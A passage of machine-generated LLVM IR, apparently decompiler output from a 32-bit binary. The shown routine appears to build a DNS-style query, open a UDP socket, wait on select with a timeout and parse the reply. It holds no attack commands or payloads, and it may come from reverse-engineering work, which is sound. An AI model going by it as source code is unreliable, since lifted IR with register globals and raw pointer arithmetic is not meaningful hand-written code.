  %v2_804d9a931 = phi i32 [ %v1_804dbda, %dec_label_pc_804dbd0 ], [ %v1_804d9ac, %dec_label_pc_804d9a9 ]
  %tmp103 = icmp slt i32 %v0_804d9af, 1
  %tmp104 = icmp eq i1 %tmp103, false
  br i1 %tmp104, label %dec_label_pc_804d996, label %dec_label_pc_804d9b3

dec_label_pc_804d9b3:                             ; preds = %dec_label_pc_804d9af, %dec_label_pc_804d950
  %v0_804d9b6 = phi i32 [ %v2_804d983, %dec_label_pc_804d950 ], [ %v2_804d9a931, %dec_label_pc_804d9af ]
  %v1_804d9b6 = inttoptr i32 %v0_804d9b6 to i8*
  store i8 0, i8* %v1_804d9b6, align 1
  store i32 %v2_804d970, i32* %eax.global-to-local, align 4
  %v3_804d9be = call i32 @function_804fd10(i8* %tmp101)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804d9d2 = add i32 %v3_804d9be, %v2_804d970
  store i32 %v2_804d9d2, i32* @edi, align 4
  %v1_804d9f6 = add i32 %v2_804d9d2, 1
  store i32 %v1_804d9f6, i32* @ebx, align 4
  store i32 %v2_804d970, i32* %eax.global-to-local, align 4
  %v3_804d9fe = call i32 @function_804fd10(i8* %tmp101)
  %v1_804da03 = add i32 %v3_804d9fe, 17
  store i32 %v1_804da03, i32* %eax.global-to-local, align 4
  %v1_804da0a = call i32 @function_804d6e0(i32 %v1_804da03)
  %v2_804da18 = udiv i32 %v1_804da0a, 65535
  store i32 %v2_804da18, i32* %edx.global-to-local, align 4
  %v2_804da2278 = add i32 %v2_804da18, %v1_804da0a
  store i32 %v2_804da2278, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804da32 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804da32, i32* %ecx.global-to-local, align 4
  %v3_804da3a = call i32 @function_804fda0(i32 %v2_804da32, i32 16)
  store i32 %v3_804da3a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804da82 = load i32, i32* @edi, align 4
  %v1_804da82 = add i32 %v0_804da82, 1
  %v2_804da82 = inttoptr i32 %v1_804da82 to i16*
  store i16 256, i16* %v2_804da82, align 2
  %v0_804da8b = load i32, i32* @ebx, align 4
  %v1_804da8b = add i32 %v0_804da8b, 2
  %v2_804da8b = inttoptr i32 %v1_804da8b to i16*
  store i16 256, i16* %v2_804da8b, align 2
  %v0_804da91 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804da91 = icmp eq i32 %v0_804da91, -1
  br i1 %v10_804da91, label %dec_label_pc_804daa2.preheader, label %dec_label_pc_804da96

dec_label_pc_804da96.loopexit:                    ; preds = %dec_label_pc_804dbb5
  %v0_804da99.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804da96

dec_label_pc_804da96:                             ; preds = %dec_label_pc_804da96.loopexit, %dec_label_pc_804d9b3
  %v0_804da99 = phi i32 [ %v0_804da99.pre, %dec_label_pc_804da96.loopexit ], [ %v0_804da91, %dec_label_pc_804d9b3 ]
  %v0_804da96 = load i32, i32* @esp, align 4
  %v2_804da99 = add i32 %v0_804da96, -16
  %v3_804da99 = inttoptr i32 %v2_804da99 to i32*
  store i32 %v0_804da99, i32* %v3_804da99, align 4
  %v1_804da9a = call i32 @function_8050233(i32 1)
  store i32 %v1_804da9a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804daa2.preheader

dec_label_pc_804daa2.preheader:                   ; preds = %dec_label_pc_804da96, %dec_label_pc_804d9b3
  br label %dec_label_pc_804daa2

dec_label_pc_804daa2:                             ; preds = %dec_label_pc_804daa2.preheader, %dec_label_pc_804dbb5
  %v0_804daa2 = load i32, i32* @ebx, align 4
  %v1_804daa2 = load i32, i32* @esp, align 4
  %v2_804daa2 = add i32 %v1_804daa2, -4
  %v3_804daa2 = inttoptr i32 %v2_804daa2 to i32*
  store i32 %v0_804daa2, i32* %v3_804daa2, align 4
  %v1_804daa3 = add i32 %v1_804daa2, -8
  %v2_804daa3 = inttoptr i32 %v1_804daa3 to i32*
  store i32 0, i32* %v2_804daa3, align 4
  %v1_804daa5 = add i32 %v1_804daa2, -12
  %v2_804daa5 = inttoptr i32 %v1_804daa5 to i32*
  store i32 2, i32* %v2_804daa5, align 4
  %v1_804daa7 = add i32 %v1_804daa2, -16
  %v2_804daa7 = inttoptr i32 %v1_804daa7 to i32*
  store i32 2, i32* %v2_804daa7, align 4
  %v4_804daa9 = call i32 @function_8050a17(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804daa9, i32* %eax.global-to-local, align 4
  %v0_804daae = load i32, i32* @esp, align 4
  store i32 %v4_804daa9, i32* @ebp, align 4
  %v10_804dab3 = icmp eq i32 %v4_804daa9, -1
  br i1 %v10_804dab3, label %dec_label_pc_804dbe0, label %dec_label_pc_804dabc

dec_label_pc_804dabc:                             ; preds = %dec_label_pc_804daa2
  %v0_804dabc = load i32, i32* @ecx, align 4
  %v2_804dabc = add i32 %v0_804daae, 12
  %v3_804dabc = inttoptr i32 %v2_804dabc to i32*
  store i32 %v0_804dabc, i32* %v3_804dabc, align 4
  %v1_804dabd = add i32 %v0_804daae, 8
  %v2_804dabd = inttoptr i32 %v1_804dabd to i32*
  store i32 16, i32* %v2_804dabd, align 4
  %v1_804dabf = add i32 %v0_804daae, 4272
  store i32 %v1_804dabf, i32* @edi, align 4
  %v2_804dac6 = add i32 %v0_804daae, 4
  %v3_804dac6 = inttoptr i32 %v2_804dac6 to i32*
  store i32 %v1_804dabf, i32* %v3_804dac6, align 4
  %v3_804dac7 = inttoptr i32 %v0_804daae to i32*
  store i32 %v4_804daa9, i32* %v3_804dac7, align 4
  %v3_804dac8 = call i32 @function_805083c(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804dacd = load i32, i32* @esp, align 4
  %v1_804dad0 = add i32 %v3_804dac8, 1
  %v8_804dad0 = icmp eq i32 %v1_804dad0, 0
  store i32 %v1_804dad0, i32* %eax.global-to-local, align 4
  br i1 %v8_804dad0, label %dec_label_pc_804dbe0, label %dec_label_pc_804dad7

dec_label_pc_804dad7:                             ; preds = %dec_label_pc_804dabc
  %v1_804dad7 = add i32 %v0_804dacd, 12
  %v2_804dad7 = inttoptr i32 %v1_804dad7 to i32*
  store i32 16384, i32* %v2_804dad7, align 4
  %v1_804dadc = add i32 %v0_804dacd, 20
  %v2_804dadc = inttoptr i32 %v1_804dadc to i32*
  %v3_804dadc = load i32, i32* %v2_804dadc, align 4
  store i32 %v3_804dadc, i32* %edx.global-to-local, align 4
  %v2_804dae0 = add i32 %v0_804dacd, 8
  %v3_804dae0 = inttoptr i32 %v2_804dae0 to i32*
  store i32 %v3_804dadc, i32* %v3_804dae0, align 4
  %v1_804dae1 = add i32 %v0_804dacd, 2096
  store i32 %v1_804dae1, i32* %eax.global-to-local, align 4
  %v2_804dae8 = add i32 %v0_804dacd, 4
  %v3_804dae8 = inttoptr i32 %v2_804dae8 to i32*
  store i32 %v1_804dae1, i32* %v3_804dae8, align 4
  %v0_804dae9 = load i32, i32* @ebp, align 4
  %v3_804dae9 = inttoptr i32 %v0_804dacd to i32*
  store i32 %v0_804dae9, i32* %v3_804dae9, align 4
  %v0_804daea = call i32 @function_8050966()
  %v0_804daef = load i32, i32* @esp, align 4
  %v1_804daf2 = add i32 %v0_804daea, 1
  %v8_804daf2 = icmp eq i32 %v1_804daf2, 0
  store i32 %v1_804daf2, i32* %eax.global-to-local, align 4
  br i1 %v8_804daf2, label %dec_label_pc_804dbe0, label %dec_label_pc_804daf9

dec_label_pc_804daf9:                             ; preds = %dec_label_pc_804dad7
  %v2_804daf9 = add i32 %v0_804daef, 12
  %v3_804daf9 = inttoptr i32 %v2_804daf9 to i32*
  store i32 %v1_804daf2, i32* %v3_804daf9, align 4
  %v1_804dafa = add i32 %v0_804daef, 8
  %v2_804dafa = inttoptr i32 %v1_804dafa to i32*
  store i32 0, i32* %v2_804dafa, align 4
  %v0_804dafc = load i32, i32* @ebp, align 4
  %v2_804dafc = add i32 %v0_804daef, 4
  %v3_804dafc = inttoptr i32 %v2_804dafc to i32*
  store i32 %v0_804dafc, i32* %v3_804dafc, align 4
  %v2_804dafd = inttoptr i32 %v0_804daef to i32*
  store i32 3, i32* %v2_804dafd, align 4
  %v3_804daff = call i32 @function_805019d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804db04 = load i32, i32* @esp, align 4
  %v12_804db07 = or i32 %v3_804daff, 2048
  store i32 %v12_804db07, i32* %eax.global-to-local, align 4
  %v2_804db0a = add i32 %v0_804db04, 8
  %v3_804db0a = inttoptr i32 %v2_804db0a to i32*
  store i32 %v12_804db07, i32* %v3_804db0a, align 4
  %v0_804db0b = load i32, i32* @ebp, align 4
  %v2_804db0b = add i32 %v0_804db04, 4
  %v3_804db0b = inttoptr i32 %v2_804db0b to i32*
  store i32 %v0_804db0b, i32* %v3_804db0b, align 4
  %v2_804db0c = inttoptr i32 %v0_804db04 to i32*
  store i32 4, i32* %v2_804db0c, align 4
  %v3_804db0e = call i32 @function_805019d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804db13 = load i32, i32* @esp, align 4
  %v1_804db13 = add i32 %v0_804db13, 4144
  store i32 %v1_804db13, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804db21 = inttoptr i32 %v1_804db13 to i8*
  store i32 %v1_804db13, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804db24 = call i8* @_memset(i8* %v1_804db21, i32 0, i32 32)
  %v6_804db24 = ptrtoint i8* %v5_804db24 to i32
  store i32 %v6_804db24, i32* %ecx.global-to-local, align 4
  %v0_804db26 = load i32, i32* @ebp, align 4
  %v2_804db2a = udiv i32 %v0_804db26, 32
  store i32 %v2_804db2a, i32* @esi, align 4
  %v1_804db2d = urem i32 %v0_804db26, 32
  store i32 %v1_804db2d, i32* @ebx, align 4
  %v0_804db30 = load i32, i32* @esp, align 4
  %v2_804db30 = mul nuw nsw i32 %v2_804db2a, 4
  %v3_804db30 = add nuw nsw i32 %v2_804db30, 4144
  %v4_804db30 = add i32 %v3_804db30, %v0_804db30
  %v5_804db30 = inttoptr i32 %v4_804db30 to i32*
  %v6_804db30 = load i32, i32* %v5_804db30, align 4
  %v9_804db30 = shl i32 1, %v1_804db2d
  %v12_804db30 = or i32 %v6_804db30, %v9_804db30
  store i32 %v12_804db30, i32* %v5_804db30, align 4
  %v0_804db38 = load i32, i32* @esp, align 4
  %v1_804db38 = add i32 %v0_804db38, 4288
  %v2_804db38 = inttoptr i32 %v1_804db38 to i32*
  store i32 5, i32* %v2_804db38, align 4
  %v0_804db43 = load i32, i32* @esp, align 4
  %v1_804db43 = add i32 %v0_804db43, 4292
  %v2_804db43 = inttoptr i32 %v1_804db43 to i32*
  store i32 0, i32* %v2_804db43, align 4
  %v0_804db4e = load i32, i32* @esp, align 4
  %v1_804db4e = inttoptr i32 %v0_804db4e to i32*
  %v1_804db4f = add i32 %v0_804db4e, 4288
  store i32 %v1_804db4f, i32* %v1_804db4e, align 4
  %v0_804db57 = load i32, i32* @ebp, align 4
  %v1_804db57 = add i32 %v0_804db57, 1
  store i32 %v1_804db57, i32* %eax.global-to-local, align 4
  %v1_804db5a = add i32 %v0_804db4e, -4
  %v2_804db5a = inttoptr i32 %v1_804db5a to i32*
  store i32 0, i32* %v2_804db5a, align 4
  %v1_804db5c = add i32 %v0_804db4e, -8
  %v2_804db5c = inttoptr i32 %v1_804db5c to i32*
  store i32 0, i32* %v2_804db5c, align 4
  %v0_804db5e = load i32, i32* %edx.global-to-local, align 4
  %v2_804db5e = add i32 %v0_804db4e, -12
  %v3_804db5e = inttoptr i32 %v2_804db5e to i32*
  store i32 %v0_804db5e, i32* %v3_804db5e, align 4
  %v0_804db5f = load i32, i32* %eax.global-to-local, align 4
  %v2_804db5f = add i32 %v0_804db4e, -16
  %v3_804db5f = inttoptr i32 %v2_804db5f to i32*
  store i32 %v0_804db5f, i32* %v3_804db5f, align 4
  %v0_804db60 = call i32 @function_805043a()
  %v0_804db65 = load i32, i32* @esp, align 4
  %v1_804db65 = add i32 %v0_804db65, 32
  %v1_804db68 = add i32 %v0_804db60, 1
  %v8_804db68 = icmp eq i32 %v1_804db68, 0
  store i32 %v1_804db68, i32* %eax.global-to-local, align 4
  br i1 %v8_804db68, label %dec_label_pc_804dbae, label %dec_label_pc_804db6b

dec_label_pc_804db6b:                             ; preds = %dec_label_pc_804daf9
  %v1_804db6b = load i32, i32* @esi, align 4
  %v2_804db6b = mul i32 %v1_804db6b, 4
  %v3_804db6b = add i32 %v0_804db65, 4160
  %v4_804db6b = add i32 %v3_804db6b, %v2_804db6b
  %v5_804db6b = inttoptr i32 %v4_804db6b to i32*
  %v6_804db6b = load i32, i32* %v5_804db6b, align 4
  %v7_804db6b = load i32, i32* @ebx, align 4
  %v8_804db6b = urem i32 %v7_804db6b, 32
  %v9_804db6b = shl i32 1, %v8_804db6b
  %v10_804db6b = and i32 %v9_804db6b, %v6_804db6b
  %v11_804db6b = icmp ne i32 %v10_804db6b, 0
  %v1_804db73 = zext i1 %v11_804db6b to i32
  %v3_804db73 = and i32 %v1_804db68, -256
  %v4_804db73 = or i32 %v1_804db73, %v3_804db73
  store i32 %v4_804db73, i32* %eax.global-to-local, align 4
  %v4_804db76 = icmp eq i1 %v11_804db6b, false
  br i1 %v4_804db76, label %dec_label_pc_804dbf4, label %dec_label_pc_804db7a

dec_label_pc_804db7a:                             ; preds = %dec_label_pc_804db6b
  %v2_804db7a = add i32 %v0_804db65, 28
  %v3_804db7a = inttoptr i32 %v2_804db7a to i32*
  store i32 %v4_804db73, i32* %v3_804db7a, align 4
  %v0_804db7b = load i32, i32* %eax.global-to-local, align 4
  %v2_804db7b = add i32 %v0_804db65, 24
  %v3_804db7b = inttoptr i32 %v2_804db7b to i32*
  store i32 %v0_804db7b, i32* %v3_804db7b, align 4
  %v1_804db7c = add i32 %v0_804db65, 20
  %v2_804db7c = inttoptr i32 %v1_804db7c to i32*
  store i32 0, i32* %v2_804db7c, align 4
  %v1_804db7e = add i32 %v0_804db65, 16
  %v2_804db7e = inttoptr i32 %v1_804db7e to i32*
  store i32 0, i32* %v2_804db7e, align 4
  %v1_804db80 = add i32 %v0_804db65, 12
  %v2_804db80 = inttoptr i32 %v1_804db80 to i32*
  store i32 16384, i32* %v2_804db80, align 4
  %v1_804db85 = add i32 %v0_804db65, 8
  %v2_804db85 = inttoptr i32 %v1_804db85 to i32*
  store i32 2048, i32* %v2_804db85, align 4
  %v1_804db8a = add i32 %v0_804db65, 64
  store i32 %v1_804db8a, i32* %eax.global-to-local, align 4
  %v2_804db8e = add i32 %v0_804db65, 4
  %v3_804db8e = inttoptr i32 %v2_804db8e to i32*
  store i32 %v1_804db8a, i32* %v3_804db8e, align 4
  %v0_804db8f = load i32, i32* @ebp, align 4
  %v3_804db8f = inttoptr i32 %v0_804db65 to i32*
  store i32 %v0_804db8f, i32* %v3_804db8f, align 4
  %v0_804db90 = call i32 @function_8050923()
  store i32 %v0_804db90, i32* %eax.global-to-local, align 4
  %v0_804db95 = load i32, i32* @esp, align 4
  store i32 %v0_804db90, i32* @ebx, align 4
  %v1_804db9a = add i32 %v0_804db95, 56
  %v2_804db9a = inttoptr i32 %v1_804db9a to i32*
  %v3_804db9a = load i32, i32* %v2_804db9a, align 4
  store i32 %v3_804db9a, i32* %eax.global-to-local, align 4
  %v2_804db9e = add i32 %v0_804db95, 16
  %v3_804db9e = inttoptr i32 %v2_804db9e to i32*
  store i32 %v3_804db9a, i32* %v3_804db9e, align 4
  %v2_804db9f = call i32 @function_804fd10(i8* inttoptr (i32 1 to i8*))
  %v1_804dba4 = add i32 %v2_804db9f, 17
  store i32 %v1_804dba4, i32* %eax.global-to-local, align 4
  %v0_804dba7 = load i32, i32* @esp, align 4
  %v1_804dba7 = add i32 %v0_804dba7, 16
  %v0_804dbaa = load i32, i32* @ebx, align 4
  %v7_804dbaa = icmp ult i32 %v0_804dbaa, %v1_804dba4
  %v1_804dbac = icmp eq i1 %v7_804dbaa, false
  br i1 %v1_804dbac, label %dec_label_pc_804dc1a, label %dec_label_pc_804dbae

dec_label_pc_804dbae:                             ; preds = %dec_label_pc_804dc46, %dec_label_pc_804dc1a, %dec_label_pc_804db7a, %dec_label_pc_804daf9
  %v0_804dbae = phi i32 [ %v1_804dc33, %dec_label_pc_804dc46 ], [ %v1_804dc33, %dec_label_pc_804dc1a ], [ %v1_804dba7, %dec_label_pc_804db7a ], [ %v1_804db65, %dec_label_pc_804daf9 ]
  %v1_804dbae = add i32 %v0_804dbae, 8
  %v2_804dbae = inttoptr i32 %v1_804dbae to i32*
  %v3_804dbae = load i32, i32* %v2_804dbae, align 4
  %v12_804dbae = icmp eq i32 %v3_804dbae, 5
  br i1 %v12_804dbae, label %dec_label_pc_804dbf4, label %dec_label_pc_804dbb5

dec_label_pc_804dbb5:                             ; preds = %dec_label_pc_804dbe0, %dec_label_pc_804dbae
  %v3_804dbb5 = phi i32 [ %v3_804dbed, %dec_label_pc_804dbe0 ], [ %v3_804dbae, %dec_label_pc_804dbae ]
  %v1_804dbbd = phi i32 [ %v1_804dbea, %dec_label_pc_804dbe0 ], [ %v0_804dbae, %dec_label_pc_804dbae ]
  %v1_804dbb5 = add i32 %v1_804dbbd, 8
  %v2_804dbb5 = inttoptr i32 %v1_804dbb5 to i32*
  %v1_804dbb9 = add i32 %v3_804dbb5, 1
  store i32 %v1_804dbb9, i32* @edi, align 4
  %v0_804dbba = load i32, i32* @ebp, align 4
  %v10_804dbba = icmp eq i32 %v0_804dbba, -1
  store i32 %v1_804dbb9, i32* %v2_804dbb5, align 4
  %v1_804dbc1 = icmp eq i1 %v10_804dbba, false
  br i1 %v1_804dbc1, label %dec_label_pc_804da96.loopexit, label %dec_label_pc_804daa2

dec_label_pc_804dbd0:                             ; preds = %dec_label_pc_804d996, %dec_label_pc_804d996
  %v0_804dbd0 = load i32, i32* @esi, align 4
  store i32 %v0_804dbd0, i32* @edx, align 4
  %v1_804dbd2 = add i32 %v0_804d996, 1
  store i32 %v1_804dbd2, i32* @ebx, align 4
  %v1_804dbd3 = trunc i32 %v0_804dbd0 to i8
  %v2_804dbd3 = load i32, i32* %edi.global-to-local, align 4
  %v3_804dbd3 = inttoptr i32 %v2_804dbd3 to i8*
  store i8 %v1_804dbd3, i8* %v3_804dbd3, align 1
  store i32 0, i32* @esi, align 4
  %v0_804dbd7 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804dbd7, i32* %edi.global-to-local, align 4
  %v0_804dbd9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dbd9 = add i32 %v0_804dbd9, -1
  store i32 %v1_804dbd9, i32* %eax.global-to-local, align 4
  %v1_804dbda = add i32 %v0_804dbd7, 1
  store i32 %v1_804dbda, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d9af

dec_label_pc_804dbe0:                             ; preds = %dec_label_pc_804dad7, %dec_label_pc_804dabc, %dec_label_pc_804daa2
  %v0_804dbe0.in = phi i32 [ %v0_804daef, %dec_label_pc_804dad7 ], [ %v0_804dacd, %dec_label_pc_804dabc ], [ %v0_804daae, %dec_label_pc_804daa2 ]
  %v2_804dbe3 = inttoptr i32 %v0_804dbe0.in to i32*
  store i32 1, i32* %v2_804dbe3, align 4
  %v0_804dbe5 = call i32 @function_8051dba()
  store i32 %v0_804dbe5, i32* %eax.global-to-local, align 4
  %v0_804dbea = load i32, i32* @esp, align 4
  %v1_804dbea = add i32 %v0_804dbea, 16
  %v1_804dbed = add i32 %v0_804dbea, 24
  %v2_804dbed = inttoptr i32 %v1_804dbed to i32*
  %v3_804dbed = load i32, i32* %v2_804dbed, align 4
  %v12_804dbed = icmp eq i32 %v3_804dbed, 5
  %v1_804dbf2 = icmp eq i1 %v12_804dbed, false
  br i1 %v1_804dbf2, label %dec_label_pc_804dbb5, label %dec_label_pc_804dbf4

dec_label_pc_804dbf4:                             ; preds = %dec_label_pc_804dbe0, %dec_label_pc_804dbae, %dec_label_pc_804db6b, %dec_label_pc_804dc54, %dec_label_pc_804dc5d.backedge
  %v0_804dbf4 = phi i32 [ %v0_804dc62122, %dec_label_pc_804dc54 ], [ %v0_804dc62, %dec_label_pc_804dc5d.backedge ], [ %v1_804dbea, %dec_label_pc_804dbe0 ], [ %v0_804dbae, %dec_label_pc_804dbae ], [ %v1_804db65, %dec_label_pc_804db6b ]
  %v0_804dbf7 = load i32, i32* @ebp, align 4
  %v2_804dbf7 = add i32 %v0_804dbf4, -16
  %v3_804dbf7 = inttoptr i32 %v2_804dbf7 to i32*
  store i32 %v0_804dbf7, i32* %v3_804dbf7, align 4
  %v1_804dbf8 = call i32 @function_8050233(i32 1)
  store i32 %v1_804dbf8, i32* %eax.global-to-local, align 4
  %v0_804dbfd = load i32, i32* @esp, align 4
  %v1_804dbfd = add i32 %v0_804dbfd, 16
  %v1_804dc00 = inttoptr i32 %v1_804dbfd to i32*
  %v2_804dc00 = load i32, i32* %v1_804dc00, align 4
  store i32 %v2_804dc00, i32* @edx, align 4
  %v1_804dc03 = inttoptr i32 %v2_804dc00 to i8*
  %v2_804dc03 = load i8, i8* %v1_804dc03, align 1
  %v3_804dc03 = icmp eq i8 %v2_804dc03, 0
  br i1 %v3_804dc03, label %dec_label_pc_804dd03, label %dec_label_pc_804dc0c

dec_label_pc_804dc0c:                             ; preds = %dec_label_pc_804dbf4
  %v2_804dc0c = load i32, i32* %v1_804dc00, align 4
  store i32 %v2_804dc0c, i32* %eax.global-to-local, align 4
  %v1_804dc0f = add i32 %v0_804dbfd, 4300
  %v1_804dc15 = inttoptr i32 %v1_804dc0f to i32*
  %v2_804dc15 = load i32, i32* %v1_804dc15, align 4
  store i32 %v2_804dc15, i32* @ebx, align 4
  %v3_804dc16 = add i32 %v0_804dbfd, 4308
  %v1_804dc17 = inttoptr i32 %v3_804dc16 to i32*
  %v2_804dc17 = load i32, i32* %v1_804dc17, align 4
  store i32 %v2_804dc17, i32* @edi, align 4
  %v3_804dc17 = add i32 %v0_804dbfd, 4312
  %v1_804dc18 = inttoptr i32 %v3_804dc17 to i32*
  %v2_804dc18 = load i32, i32* %v1_804dc18, align 4
  store i32 %v2_804dc18, i32* @ebp, align 4
  ret i32 %v2_804dc0c

dec_label_pc_804dc1a:                             ; preds = %dec_label_pc_804db7a
  %v1_804dc1a = add i32 %v0_804dba7, 60
  store i32 %v1_804dc1a, i32* %edx.global-to-local, align 4
  %v2_804dc1e = add i32 %v0_804dba7, 40
  %v3_804dc1e = inttoptr i32 %v2_804dc1e to i32*
  store i32 %v1_804dc1a, i32* %v3_804dc1e, align 4
  %v0_804dc22 = load i32, i32* @esp, align 4
  %v1_804dc25 = add i32 %v0_804dc22, 44
  store i32 %v1_804dc25, i32* %ecx.global-to-local, align 4
  %v2_804dc29 = add i32 %v0_804dc22, -16
  %v3_804dc29 = inttoptr i32 %v2_804dc29 to i32*
  store i32 %v1_804dc25, i32* %v3_804dc29, align 4
  %v2_804dc2a = call i32 @function_804fd10(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804dc2a, i32* %eax.global-to-local, align 4
  %v0_804dc2f = load i32, i32* @esp, align 4
  %v2_804dc2f = add i32 %v2_804dc2a, 65
  %v3_804dc2f = add i32 %v2_804dc2f, %v0_804dc2f
  store i32 %v3_804dc2f, i32* %ecx.global-to-local, align 4
  %v1_804dc33 = add i32 %v0_804dc2f, 16
  %v1_804dc36 = add i32 %v0_804dc2f, 30
  %v2_804dc36 = inttoptr i32 %v1_804dc36 to i16*
  %v3_804dc36 = load i16, i16* %v2_804dc36, align 2
  %v4_804dc36 = zext i16 %v3_804dc36 to i32
  %v7_804dc36 = and i32 %v1_804db13, -65536
  %v8_804dc36 = or i32 %v4_804dc36, %v7_804dc36
  store i32 %v8_804dc36, i32* @edi, align 4
  %v3_804dc3b = add i32 %v0_804dc2f, 48
  %v4_804dc3b = inttoptr i32 %v3_804dc3b to i16*
  %v5_804dc3b = load i16, i16* %v4_804dc3b, align 2
  %v16_804dc3b = icmp eq i16 %v3_804dc36, %v5_804dc3b
  %v1_804dc40 = icmp eq i1 %v16_804dc3b, false
  br i1 %v1_804dc40, label %dec_label_pc_804dbae, label %dec_label_pc_804dc46

dec_label_pc_804dc46:                             ; preds = %dec_label_pc_804dc1a
  %v1_804dc46 = add i32 %v0_804dc2f, 54
  %v2_804dc46 = inttoptr i32 %v1_804dc46 to i16*
  %v3_804dc46 = load i16, i16* %v2_804dc46, align 2
  %v4_804dc46 = zext i16 %v3_804dc46 to i32
  %v6_804dc46 = and i32 %v2_804dc2a, -65536
  %v7_804dc46 = or i32 %v4_804dc46, %v6_804dc46
  store i32 %v7_804dc46, i32* %eax.global-to-local, align 4
  %v4_804dc4b = icmp eq i16 %v3_804dc46, 0
  br i1 %v4_804dc4b, label %dec_label_pc_804dbae, label %dec_label_pc_804dc54

dec_label_pc_804dc54:                             ; preds = %dec_label_pc_804dc46
  %v2_804dc54 = call i16 @llvm.bswap.i16(i16 %v3_804dc46)
  %v3_804dc54 = zext i16 %v2_804dc54 to i32
  %v6_804dc54 = or i32 %v3_804dc54, %v6_804dc46
  store i32 %v6_804dc54, i32* %eax.global-to-local, align 4
  %v3_804dc58 = add i32 %v0_804dc2f, 38
  %v4_804dc58 = inttoptr i32 %v3_804dc58 to i16*
  store i16 %v2_804dc54, i16* %v4_804dc58, align 2
  %v0_804dc5d117 = load i32, i32* @esp, align 4
  %v1_804dc5d118 = add i32 %v0_804dc5d117, 22
  %v2_804dc5d119 = inttoptr i32 %v1_804dc5d118 to i16*
  %v3_804dc5d120 = load i16, i16* %v2_804dc5d119, align 2
  %v4_804dc5d121 = add i16 %v3_804dc5d120, -1
  store i16 %v4_804dc5d121, i16* %v2_804dc5d119, align 2
  %v0_804dc62122 = load i32, i32* @esp, align 4
  %v1_804dc62123 = add i32 %v0_804dc62122, 22
  %v2_804dc62124 = inttoptr i32 %v1_804dc62123 to i16*
  %v3_804dc62125 = load i16, i16* %v2_804dc62124, align 2
  %v13_804dc62126 = icmp eq i16 %v3_804dc62125, -1
  br i1 %v13_804dc62126, label %dec_label_pc_804dbf4, label %dec_label_pc_804dc6a

dec_label_pc_804dc6a:                             ; preds = %dec_label_pc_804dc54, %dec_label_pc_804dc5d.backedge
  %v0_804dc62127 = phi i32 [ %v0_804dc62, %dec_label_pc_804dc5d.backedge ], [ %v0_804dc62122, %dec_label_pc_804dc54 ]
  %v0_804dc6a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804dc6a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804dc7313 = inttoptr i32 %v0_804dc6a to i8*
  %v2_804dc7314 = load i8, i8* %v1_804dc7313, align 1
  %v3_804dc7315 = zext i8 %v2_804dc7314 to i32
  %v4_804dc7316 = load i32, i32* %eax.global-to-local, align 4
  %v5_804dc7317 = and i32 %v4_804dc7316, -256
  %v6_804dc7318 = or i32 %v5_804dc7317, %v3_804dc7315
  store i32 %v6_804dc7318, i32* %eax.global-to-local, align 4
  %v4_804dc7519 = icmp eq i8 %v2_804dc7314, 0
  br i1 %v4_804dc7519, label %dec_label_pc_804dcaa, label %dec_label_pc_804dc79.preheader.preheader

dec_label_pc_804dc79.preheader.preheader:         ; preds = %dec_label_pc_804dc6a
  %v1_804dc9e = add i32 %v0_804dc62127, 32
  br label %dec_label_pc_804dc79.preheader

dec_label_pc_804dc79.preheader:                   ; preds = %dec_label_pc_804dc79.preheader.preheader, %dec_label_pc_804dd3c
  %v0_804dd40 = phi i32 [ %v3_804dd40, %dec_label_pc_804dd3c ], [ 1, %dec_label_pc_804dc79.preheader.preheader ]
  %v0_804dd3d42 = phi i32 [ %v0_804dd3d, %dec_label_pc_804dd3c ], [ 0, %dec_label_pc_804dc79.preheader.preheader ]
  %v0_804dc8638 = phi i32 [ %v1_804dd3c, %dec_label_pc_804dd3c ], [ %v0_804dc6a, %dec_label_pc_804dc79.preheader.preheader ]
  %v0_804dc7936 = phi i32 [ %v6_804dc73, %dec_label_pc_804dd3c ], [ %v6_804dc7318, %dec_label_pc_804dc79.preheader.preheader ]
  br label %dec_label_pc_804dc79

dec_label_pc_804dc79:                             ; preds = %dec_label_pc_804dc79.preheader, %dec_label_pc_804dc81
  %v0_804dd3d = phi i32 [ %v0_804dd3d42, %dec_label_pc_804dc79.preheader ], [ 1, %dec_label_pc_804dc81 ]
  %v0_804dd3c = phi i32 [ %v0_804dc8638, %dec_label_pc_804dc79.preheader ], [ %v2_804dca2, %dec_label_pc_804dc81 ]
  %v4_804dc73 = phi i32 [ %v0_804dc7936, %dec_label_pc_804dc79.preheader ], [ %v6_804dca4, %dec_label_pc_804dc81 ]
  %v1_804dc79 = trunc i32 %v4_804dc73 to i8
  %tmp139 = icmp ult i8 %v1_804dc79, -64
  br i1 %tmp139, label %dec_label_pc_804dd3c, label %dec_label_pc_804dc81

dec_label_pc_804dc81:                             ; preds = %dec_label_pc_804dc79
  %v1_804dc81 = urem i32 %v4_804dc73, 256
  store i32 %v1_804dc81, i32* %eax.global-to-local, align 4
  %v1_804dc86 = add i32 %v0_804dd3c, 1
  %v2_804dc86 = inttoptr i32 %v1_804dc86 to i8*
  %v3_804dc86 = load i8, i8* %v2_804dc86, align 1
  %v4_804dc86 = zext i8 %v3_804dc86 to i32
